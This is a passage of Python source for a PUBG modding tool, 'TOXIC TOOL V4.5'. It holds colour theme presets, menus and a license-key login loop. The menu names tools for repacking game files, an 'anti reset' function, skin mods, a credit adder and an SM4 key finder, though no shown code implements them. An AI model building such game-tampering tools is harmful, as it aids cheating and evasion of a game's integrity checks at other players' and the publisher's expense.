            "info": "bright_cyan"
        }
    },
    "24": {
        "name": "🔥 Lava",
        "colors": {
            "primary": "bright_red",
            "secondary": "bright_yellow",
            "accent": "bright_red",
            "border": "bright_red",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim red",
            "panel_border": "bright_red",
            "title": "bold bright_red",
            "success": "bright_yellow",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "25": {
        "name": "🧊 Ice",
        "colors": {
            "primary": "bright_cyan",
            "secondary": "bright_white",
            "accent": "bright_blue",
            "border": "bright_cyan",
            "text": "white",
            "highlight": "bright_white",
            "dim": "dim cyan",
            "panel_border": "bright_cyan",
            "title": "bold bright_cyan",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "26": {
        "name": "🍊 Citrus",
        "colors": {
            "primary": "bright_yellow",
            "secondary": "bright_red",
            "accent": "bright_green",
            "border": "bright_yellow",
            "text": "white",
            "highlight": "bright_white",
            "dim": "dim yellow",
            "panel_border": "bright_yellow",
            "title": "bold bright_yellow",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_white",
            "info": "bright_cyan"
        }
    },
    "27": {
        "name": "🌹 Rose",
        "colors": {
            "primary": "bright_magenta",
            "secondary": "bright_red",
            "accent": "bright_white",
            "border": "bright_magenta",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim magenta",
            "panel_border": "bright_magenta",
            "title": "bold bright_magenta",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "28": {
        "name": "🎆 Fireworks",
        "colors": {
            "primary": "bright_red",
            "secondary": "bright_yellow",
            "accent": "bright_blue",
            "border": "bright_red",
            "text": "white",
            "highlight": "bright_green",
            "dim": "dim red",
            "panel_border": "bright_red",
            "title": "bold bright_red",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "29": {
        "name": "🌿 Forest",
        "colors": {
            "primary": "green",
            "secondary": "bright_green",
            "accent": "bright_yellow",
            "border": "green",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim green",
            "panel_border": "green",
            "title": "bold green",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "30": {
        "name": "🌞 Sunrise",
        "colors": {
            "primary": "bright_yellow",
            "secondary": "bright_red",
            "accent": "bright_magenta",
            "border": "bright_yellow",
            "text": "white",
            "highlight": "bright_white",
            "dim": "dim yellow",
            "panel_border": "bright_yellow",
            "title": "bold bright_yellow",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_white",
            "info": "bright_cyan"
        }
    },
    
    # ==================== SPECIAL THEMES ====================
    
    "31": {
        "name": "🌈 RGB Rainbow",
        "colors": {
            "primary": "bright_red",
            "secondary": "bright_green",
            "accent": "bright_blue",
            "border": "bright_yellow",
            "text": "white",
            "highlight": "bright_magenta",
            "dim": "dim white",
            "panel_border": "bright_cyan",
            "title": "bold bright_magenta",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "32": {
        "name": "🎨 RGB Matrix",
        "colors": {
            "primary": "bright_green",
            "secondary": "bright_red",
            "accent": "bright_blue",
            "border": "bright_magenta",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim green",
            "panel_border": "bright_red",
            "title": "bold bright_cyan",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_blue"
        }
    },
    "33": {
        "name": "💫 RGB Pulse",
        "colors": {
            "primary": "bright_blue",
            "secondary": "bright_red",
            "accent": "bright_green",
            "border": "bright_yellow",
            "text": "white",
            "highlight": "bright_magenta",
            "dim": "dim blue",
            "panel_border": "bright_magenta",
            "title": "bold bright_yellow",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "34": {
        "name": "🌟 RGB Glow",
        "colors": {
            "primary": "bright_yellow",
            "secondary": "bright_magenta",
            "accent": "bright_cyan",
            "border": "bright_red",
            "text": "white",
            "highlight": "bright_green",
            "dim": "dim yellow",
            "panel_border": "bright_blue",
            "title": "bold bright_magenta",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_cyan"
        }
    },
    "35": {
        "name": "🌈 RGB Spectrum",
        "colors": {
            "primary": "bright_red",
            "secondary": "bright_blue",
            "accent": "bright_green",
            "border": "bright_magenta",
            "text": "white",
            "highlight": "bright_yellow",
            "dim": "dim red",
            "panel_border": "bright_cyan",
            "title": "bold bright_green",
            "success": "bright_green",
            "error": "bright_red",
            "warning": "bright_yellow",
            "info": "bright_blue"
        }
    }
}

# Initialize theme - load from config or use default
_current_theme_key = "0"
load_theme_from_config()

def get_theme_colors():
    """Get current theme colors"""
    return THEME_PRESETS[_current_theme_key]["colors"]

def set_theme(theme_key):
    """Set the current theme and save to config"""
    global _current_theme_key
    if theme_key in THEME_PRESETS:
        _current_theme_key = theme_key
        save_theme_to_config()
        return True
    return False

def get_theme_name():
    """Get current theme name"""
    return THEME_PRESETS[_current_theme_key]["name"]

def reset_to_default_theme():
    """Reset theme to default and save"""
    global _current_theme_key
    _current_theme_key = "0"
    save_theme_to_config()
    return True

def apply_theme_to_panel(content, border_style=None):
    """Apply theme colors to panel content"""
    theme = get_theme_colors()
    if border_style is None:
        border_style = theme["panel_border"]
    return Panel(content, border_style=border_style, box=box.ROUNDED)

def get_colored_text(text, color_key):
    """Get colored text using theme colors"""
    theme = get_theme_colors()
    color = theme.get(color_key, "white")
    return f"[{color}]{text}[/{color}]"

def handle_theme_customizer():
    """Theme Color Customizer - Option 17"""
    global _current_theme_key
    
    while True:
        # Use a clean banner without theme colors for the theme selector
        clear_screen()
        
        current_theme_name = get_theme_name()
        theme_colors = get_theme_colors()
        
        # Build theme preview
        preview_lines = []
        preview_lines.append(f"[bold cyan] THEME COLOR CUSTOMIZER[/bold cyan]")
        preview_lines.append(f"[cyan]{'─' * 40}[/]")
        preview_lines.append(f"\n[bold white]Current Theme:[/] {current_theme_name}")
        preview_lines.append("")
        
        # Color preview using current theme
        primary = theme_colors["primary"]
        secondary = theme_colors["secondary"]
        accent = theme_colors["accent"]
        border = theme_colors["border"]
        highlight = theme_colors["highlight"]
        
        preview_lines.append(f"[{primary}]███████[/] [{secondary}]███████[/] [{accent}]███████[/] [{border}]███████[/] [{highlight}]███████[/]")
        preview_lines.append(f"[{primary}]  PRIMARY  [/] [{secondary}] SECONDARY [/] [{accent}]  ACCENT   [/] [{border}]  BORDER   [/] [{highlight}] HIGHLIGHT [/]")
        preview_lines.append("")
        
        preview_lines.append("[bold green]📋 Standard Themes:[/bold green]")
        preview_lines.append("")
        
        # Show standard themes (0-30)
        standard_themes = []
        for i in range(0, 31):
            key = str(i)
            if key in THEME_PRESETS:
                theme = THEME_PRESETS[key]
                if key == "0":
                    standard_themes.append(f"[bold cyan]  {key}. {theme['name']}[/bold cyan]")
                else:
                    color = theme["colors"]["primary"]
                    standard_themes.append(f"[{color}]  {key}. {theme['name']}[/{color}]")
        
        # Display standard themes in 4 columns
        for i in range(0, len(standard_themes), 4):
            row = standard_themes[i:i+4]
            preview_lines.append("  ".join(row))
        
        preview_lines.append("")
        preview_lines.append("[bold magenta]🌟 SPECIAL THEMES (RGB & MULTI-COLOR):[/bold magenta]")
        preview_lines.append("")
        
        # Show special themes (31-35)
        special_themes = []
        for i in range(31, 36):
            key = str(i)
            if key in THEME_PRESETS:
                theme = THEME_PRESETS[key]
                color = theme["colors"]["primary"]
                special_themes.append(f"[{color}]  {key}. {theme['name']}[/{color}]")
        
        # Display special themes in a row
        preview_lines.append("   ".join(special_themes))
        
        preview_lines.append("")
        preview_lines.append("[bold red][0][/bold red] BACK TO MAIN MENU")
        preview_lines.append("[bold yellow][D][/bold yellow] RESET TO DEFAULT THEME")
        
        console.print(Panel(
            "\n".join(preview_lines),
            border_style=theme_colors["panel_border"],
            padding=(1, 3),
            box=box.ROUNDED
        ))
        console.print()
        
        try:
            choice = Prompt.ask('[bold yellow]Select theme (0-35) or D for default [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice.upper() == "D":
            reset_to_default_theme()
            console.print(Panel(
                f"[bold green]✅ Theme reset to: {get_theme_name()}[/bold green]",
                border_style="green",
                padding=(1, 2),
                box=box.ROUNDED
            ))
            time.sleep(0.8)
        elif choice == "0":
            break
        elif choice in THEME_PRESETS:
            set_theme(choice)
            new_theme = get_theme_name()
            console.print(Panel(
                f"[bold green]✅ Theme changed to: {new_theme}[/bold green]",
                border_style="green",
                padding=(1, 2),
                box=box.ROUNDED
            ))
            time.sleep(0.8)
        else:
            console.print(Panel(
                f'[bold red]❌ Option {choice} is invalid[/]',
                title='[bold red]Error[/]',
                border_style="red",
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')

# UPDATED show_banner function with theme support for ALL UI
def show_banner():
    """Display pixel-style VIP banner with current theme colors."""
    clear_screen()
    
    theme = get_theme_colors()
    primary = theme["primary"]
    secondary = theme["secondary"]
    accent = theme["accent"]
    border = theme["border"]
    highlight = theme["highlight"]
    panel_border = theme["panel_border"]
    title_style = theme["title"]

    # ── Pixel-block logo ──────────────────────────────────────────
    LOGO_LINES = [
        " ███████╗ ██╗   ██╗ ██████╗  ██╗  ██╗  █████╗  ███╗  ██╗",
        " ██╔════╝ ██║   ██║ ██╔══██╗ ██║  ██║ ██╔══██╗ ████╗ ██║",
        " ███████╗ ██║   ██║ ██████╔╝ ███████║ ███████║ ██╔██╗██║",
        " ╚════██║ ██║   ██║ ██╔══██╗ ██╔══██║ ██╔══██║ ██║╚████║",
        " ███████║ ╚██████╔╝ ██████╔╝ ██║  ██║ ██║  ██║ ██║ ╚███║",
        " ╚══════╝  ╚═════╝  ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝  ╚══╝",
    ]
    logo_text = Text("\n".join(LOGO_LINES), style=f"bold {primary}", justify="center")

    console.print(Panel(
        Align.center(logo_text),
        box=box.SQUARE,
        border_style=f"bold {panel_border}",
        padding=(0, 2),
    ))

    # ── Subtitle bar ─────────────────────────────────────────────
    sub = Text(justify="center")
    sub.append("  ALL PUBG  ", style=f"bold {secondary}")
    sub.append("──►  ", style="dim white")
    sub.append("SUPPORT", style=f"bold {highlight}")
    sub.append("    DEVELOPER  ", style=f"bold {secondary}")
    sub.append("──►  ", style="dim white")
    sub.append("@Black_Toxic000", style=f"bold {highlight}")
    sub.append(f"    V4.5  ", style=f"bold {accent}")
    console.print(Panel(
        Align.center(sub),
        box=box.SQUARE,
        border_style=highlight,
        padding=(0, 0),
    ))

    # ── Status bar ───────────────────────────────────────────────
    status = Text(justify="center")
    status.append("  🟢 LICENSED", style=f"bold {highlight}")
    status.append("   │   ", style="dim white")
    status.append(
    f"📅 {datetime.now().strftime('%Y-%m-%d  %I:%M:%S %p')}",
    style=f"bold {accent}")
    status.append("   │   ", style="dim white")
    status.append("📂 TOXIC_4.5", style=f"bold {secondary}")
    status.append("   │   ", style="dim white")
    status.append(f"🎨 {get_theme_name()}  ", style=f"bold {primary}")
    console.print(Align.center(status))
    console.print()

# Helper function to create themed panels
def themed_panel(content, title=None, border_style=None, padding=(1, 2)):
    """Create a panel with current theme colors"""
    theme = get_theme_colors()
    if border_style is None:
        border_style = theme["panel_border"]
    
    if title:
        title = f"[{theme['title']}]{title}[/{theme['title']}]"
    
    return Panel(
        content,
        title=title,
        border_style=border_style,
        padding=padding,
        box=box.ROUNDED
    )

# Update main menu to use themed panels
def main():
    """Main function — Pixel-style VIP UI with theme support."""
    create_folder_structure()

    while True:
        show_banner()

        theme = get_theme_colors()
        
        # ── MAIN MENU header with theme colors ────────────────────
        main_menu_content = (
            f'[{theme["title"]}]MAIN MENU[/{theme["title"]}]\n'
            f'[{theme["dim"]}]{"─" * 28}[/]\n\n'
            f'[{theme["success"]}][1][/{theme["success"]}] ZSDIC TOOL            [{theme["accent"]}]➛ ZSTD Dictionary Unpacker[/]\n'
            f'[{theme["success"]}][2][/{theme["success"]}] MINI OBB TOOL         [{theme["accent"]}]➛ OBB Smart Repack/Unpack[/]\n'
            f'[{theme["success"]}][3][/{theme["success"]}] OD PAK TOOL           [{theme["accent"]}]➛ OD Pak Files Handler[/]\n'
            f'[{theme["success"]}][4][/{theme["success"]}] GAME PATCH TOOL       [{theme["accent"]}]➛ Patch Files Processor[/]\n'
            f'[{theme["success"]}][5][/{theme["success"]}] AUTO 120 FPS          [{theme["accent"]}]➛ High FPS Auto Unlock[/]\n'
            f'[{theme["success"]}][6][/{theme["success"]}] ANTIRESET OBB TOOL    [{theme["accent"]}]➛ Anti Reset Your OBB[/]\n'
            f'[{theme["success"]}][7][/{theme["success"]}] ACTIVE.SAV MAKER      [{theme["accent"]}]➛ Generate Active SAV File[/]\n'
            f'[{theme["success"]}][8][/{theme["success"]}] ENCRYPT PAK FILES     [{theme["accent"]}]➛ Encrypt/Decrypt PAK[/]\n'
            f'[{theme["success"]}][9][/{theme["success"]}] PAK PROTECTOR         [{theme["accent"]}]➛ Anti-unpack protection[/]\n'
            f'[{theme["success"]}][10][/{theme["success"]}] ADVANCE TOOL         [{theme["accent"]}]➛ Advance Unpack/Repack[/]\n'
            f'[{theme["success"]}][11][/{theme["success"]}] SKIN TOOL            [{theme["accent"]}]➛ Mini/ZSDIC Auto Skins[/]\n'
            f'[{theme["success"]}][12][/{theme["success"]}] CREDIT TOOL          [{theme["accent"]}]➛ Game Credit Add[/]\n'
            f'[{theme["success"]}][13][/{theme["success"]}] SMART PRESETS        [{theme["accent"]}]➛ Auto Config & Quick Mods[/]\n'
            f'[{theme["success"]}][14][/{theme["success"]}] DAT COMPARE TOOL     [{theme["accent"]}]➛ Compare dats[/]\n'
            f'[{theme["success"]}][15][/{theme["success"]}] SM4 KEY FINDER       [{theme["accent"]}]➛ Find SM4 keys in .so files[/]\n'
            f'[{theme["success"]}][16][/{theme["success"]}] SPLIT & MERGE FILES  [{theme["accent"]}]➛ Split & Merge Files In 64kb[/]\n'
            f'[{theme["success"]}][17][/{theme["success"]}] PYTHON ENCRYPT TOOL  [{theme["accent"]}]➛ Encrypt .py scripts[/]\n'
            f'[{theme["success"]}][18][/{theme["success"]}] LICENSE VIEWER       [{theme["accent"]}]➛ View license information[/]\n'
            f'[{theme["success"]}][19][/{theme["success"]}] THEME COLOR          [{theme["accent"]}]➛ Change UI theme colors[/]\n'
            f'[{theme["success"]}][20][/{theme["success"]}] PAK + LUA TOOL       [{theme["accent"]}]➛ Unpack/Repack PAK + Lua[/]\n'
            f'[{theme["error"]}][0][/{theme["error"]}] EXIT'
        )
        
        console.print(Panel(
            main_menu_content,
            border_style=theme["panel_border"],
            padding=(1, 3),
            box=box.ROUNDED
        ))
        console.print()

        # ── Prompt ────────────────────────────────────────────────
        try:
            choice = Prompt.ask(f'[{theme["accent"]}]Select option [/]', default='', show_default=False)
        except KeyboardInterrupt:
            console.print(Panel(f'[{theme["success"]}]🎉 Thank you for using TOXIC TOOL![/]', border_style=theme["success"], box=box.ROUNDED))
            break

        if choice == "1":
            show_type_menu('ZSDIC', 'ZSDIC TOOL')
        elif choice == "2":
            show_type_menu('MINI_OBB', 'MINI OBB TOOL')
        elif choice == "3":
            show_type_menu('OD_PAK', 'OD PAK TOOL')
        elif choice == "4":
            show_type_menu('GAMEPATCH', 'GAME PATCH TOOL')
        elif choice == "5":
            handle_auto_120fps()
        elif choice == "6":
            handle_antireset_tool()
        elif choice == "7":
            handle_active_sav_maker()
        elif choice == "8":
            handle_encryption_tool()
        elif choice == "9":
            handle_pak_protector()
        elif choice == "10":
            handle_grw_tool()
        elif choice == "11":
            handle_skin_tool()
        elif choice == "12":
            handle_credit_tool()
        elif choice == "13":
            smart_presets_menu()
        elif choice == "14":
            handle_dat_compare()
        elif choice == "15":
            handle_sm4_finder()
        elif choice == "16":
            file_split_merge_menu()
        elif choice == "17":
            handle_encryption_tool_integrated()
        elif choice == "18":
            handle_license_viewer()
        elif choice == "19":
            handle_theme_customizer()
        elif choice == "20":
            handle_pak_lua_tool()
        elif choice in ("0", "x", "X", "✗"):
            console.print(Panel(f'[{theme["success"]}]🎉 Thank you for using TOXIC TOOL![/]', border_style=theme["success"], box=box.ROUNDED))
            break
        else:
            console.print(Panel(f'[{theme["error"]}]❌ Option {choice} is invalid[/]', title=f'[{theme["error"]}]Error[/]', border_style=theme["error"], box=box.ROUNDED))
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')


def show_type_menu(folder_type: str, type_name: str):
    """Pixel-style sub-menu for a specific tool type with theme support."""
    icons = {
        'ZSDIC':     '📦 ZSDIC TOOL',
        'MINI_OBB':  '📦 MINI OBB TOOL',
        'OD_PAK':    '📦 OD PAK TOOL',
        'GAMEPATCH': '📦 GAME PATCH TOOL',
    }
    label = icons.get(folder_type, type_name)
    extra_tools = folder_type in ('GAMEPATCH', 'ZSDIC', 'MINI_OBB')
    theme = get_theme_colors()

    while True:
        show_banner()

        extra_lines = (
            f'\n[{theme["success"]}][9][/{theme["success"]}]  UNPACK LUA ONLY        [{theme["accent"]}]➛ Extract .lua files[/]'
            f'\n[{theme["success"]}][10][/{theme["success"]}] LIST FILE EXTENSIONS   [{theme["accent"]}]➛ See All Available Dats[/]'
        ) if extra_tools else ''

        tool_menu_content = (
            f'[{theme["title"]}]{label}[/]\n'
            f'[{theme["dim"]}]{"─" * 32}[/]\n\n'
            f'[{theme["info"]}]Path[/]: [{theme["text"]}]{BASE_DIR / folder_type}[/]\n\n'
            f'[{theme["success"]}][1][/{theme["success"]}]  UNPACK                 [{theme["accent"]}]➛ Take all dats from PAK[/]\n'
            f'[{theme["success"]}][2][/{theme["success"]}]  REPACK                 [{theme["accent"]}]➛ Pack files back into PAK[/]\n'
            f'[{theme["success"]}][3][/{theme["success"]}]  COMPARE DAT FILES      [{theme["accent"]}]➛ Diff and extract changes[/]\n'
            f'[{theme["success"]}][4][/{theme["success"]}]  SEARCH TEXT IN FILES   [{theme["accent"]}]➛ Find text in unpack data[/]\n'
            f'[{theme["success"]}][5][/{theme["success"]}]  SEARCH FILES BY NAME   [{theme["accent"]}]➛ Locate file by name[/]\n'
            f'[{theme["success"]}][6][/{theme["success"]}]  CLEAR UNPACK DATA      [{theme["accent"]}]➛ Delete unpacked output[/]\n'
            f'[{theme["success"]}][7][/{theme["success"]}]  SINGLE CHUNK UNPACK    [{theme["accent"]}]➛ Unpack one file by name[/]\n'
            f'[{theme["success"]}][8][/{theme["success"]}]  MULTI CHUNK UNPACK     [{theme["accent"]}]➛ Unpack multiple files[/]'
            f'{extra_lines}\n\n'
            f'[{theme["error"]}][0][/{theme["error"]}]  BACK TO MAIN MENU'
        )

        console.print(Panel(
            tool_menu_content,
            border_style=theme["panel_border"],
            padding=(1, 3),
            box=box.ROUNDED
        ))
        console.print()

        try:
            choice = Prompt.ask(f'[{theme["accent"]}]Select option [/]', default='', show_default=False)
        except KeyboardInterrupt:
            break

        if choice == '1':
            handle_unpack(folder_type, type_name)
        elif choice == '2':
            repack_menu(folder_type, type_name)
        elif choice == '3':
            fast_compare_and_extract_with_choice(folder_type)
        elif choice == '4':
            search_text_in_files(folder_type, type_name)
        elif choice == '5':
            search_files_by_name(folder_type, type_name)
        elif choice == '6':
            handle_clear_data(folder_type, type_name)
        elif choice == '7':
            unpack_file_blocks_using_filename(folder_type)
        elif choice == '8':
            unpack_multiple_files_by_name(folder_type)
        elif choice == '9' and extra_tools:
            handle_lua_only_unpack(folder_type)
        elif choice == '10' and extra_tools:
            handle_extension_lister(folder_type)
        elif choice == '0':
            break
        else:
            console.print(Panel(
                f'[{theme["error"]}]❌ Option {choice} is invalid[/]',
                border_style=theme["error"],
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

if __name__ == "__main__":
    MAX_ATTEMPTS = 5
    attempts = 0
    
    while attempts < MAX_ATTEMPTS:
        show_banner()
        
        console.print(Panel(
            f'[bold cyan]🔐  AUTHENTICATION REQUIRED[/bold cyan]\n[cyan]{"─" * 30}[/]\n\n[green]Enter your license key to access[/]\n[bold yellow]TOXIC TOOL V4.5[/bold yellow]\n\n[dim]Attempt {attempts + 1} of {MAX_ATTEMPTS}[/dim]',
            box=box.ROUNDED,
            border_style="yellow",
            padding=(1, 3),
        ))
        console.print()

        if verify_key():
            # Short boot delay for effect
            with Progress(
                SpinnerColumn(spinner_name="dots12", style="bold cyan"),
                TextColumn("[bold cyan]  Loading TOXIC TOOL...[/bold cyan]"),
                console=console,
                transient=True,
            ) as prog:
                prog.add_task("boot", total=None)
                time.sleep(1.0)
            main()
            break  # Exit the login loop after main menu closes
        else:
            attempts += 1
            if attempts >= MAX_ATTEMPTS:
                console.print(Panel(
                    f'[bold red]❌  MAXIMUM ATTEMPTS REACHED ({MAX_ATTEMPTS})[/bold red]\n\n[white]Too many failed attempts.\nPlease contact @Black_Toxic000 if you need assistance.[/]',
                    box=box.ROUNDED,
                    border_style="red",
                    padding=(1, 3),
                ))
                time.sleep(2)
                sys.exit(1)
            else:
                console.print()
                console.print(Panel(
                    f'[bold red]❌  Invalid License Key[/bold red]\n\n[white]Please check your key and try again.\nRemaining attempts: {MAX_ATTEMPTS - attempts}[/]',
                    box=box.ROUNDED,
                    border_style="red",
                    padding=(1, 2),
                ))
                time.sleep(2)
                # Loop will continue to show login again